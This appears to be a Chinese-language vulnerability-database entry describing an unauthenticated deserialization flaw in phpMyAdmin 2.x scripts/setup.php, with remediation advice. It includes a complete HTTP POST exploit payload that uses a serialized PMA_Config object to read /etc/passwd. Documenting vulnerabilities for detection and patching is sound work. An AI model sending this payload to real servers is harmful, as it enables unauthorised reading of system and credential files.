---
id: PHPMYADMIN-WOOYUN-2016-199433
title: phpmyadmin scripts/setup.php 反序列化漏洞（WooYun-2016-199433）
product: phpmyadmin
vendor: phpMyAdmin
version_affected: "2.x"
severity: CRITICAL
tags: [rce, deserialization, 无需认证]
fingerprint: ["phpMyAdmin"]
---

## 漏洞描述

phpMyAdmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。

## 影响版本

- phpMyAdmin 2.x

## 前置条件

- 无需认证
- 需要能够访问 scripts/setup.php

## 利用步骤

1. 发送带有反序列化 payload 的 POST 请求

## Payload

```http
POST /scripts/setup.php HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
```

## 验证方法

```bash
# 检查响应中是否包含文件内容
```

## 修复建议

1. 升级 phpMyAdmin 至最新版本
2. 禁用或删除 setup.php
3. 升级 PHP 版本
